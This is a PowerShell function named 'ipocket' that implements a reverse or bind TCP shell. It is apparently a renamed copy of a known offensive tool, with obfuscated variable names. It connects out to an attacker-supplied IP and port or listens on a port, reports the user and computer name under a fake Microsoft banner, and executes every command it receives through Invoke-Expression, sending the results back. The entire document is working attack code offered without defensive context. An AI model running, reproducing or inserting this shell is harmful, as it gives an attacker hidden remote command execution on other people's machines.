function ipocket 
{    
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $cli33333nt = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $cli33333nt = $listener.AcceptTcpClient()
        } 

        $yeh1ist434m = $cli33333nt.GetStream()
        [byte[]]$b00ot33ysss = 0..65535|%{0}

        #Send back current username and computername
        $sbyzeees = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $yeh1ist434m.Write($sbyzeees,0,$sbyzeees.Length)

        #Show an interactive PowerShell prompt
        $sbyzeees = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $yeh1ist434m.Write($sbyzeees,0,$sbyzeees.Length)

        while(($i = $yeh1ist434m.Read($b00ot33ysss, 0, $b00ot33ysss.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $maaalhaiiinaaaww = $EncodedText.GetString($b00ot33ysss,0, $i)
            try
            {
                #Execute the command on the target.
                $peeechebhejo = (Invoke-Expression -Command $maaalhaiiinaaaww 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $peeechebhejo2  = $peeechebhejo + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $peeechebhejo2 = $peeechebhejo2 + $x

            #Return the results
            $bhejoiiuu = ([text.encoding]::ASCII).GetBytes($peeechebhejo2)
            $yeh1ist434m.Write($bhejoiiuu,0,$bhejoiiuu.Length)
            $yeh1ist434m.Flush()  
        }
        $cli33333nt.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
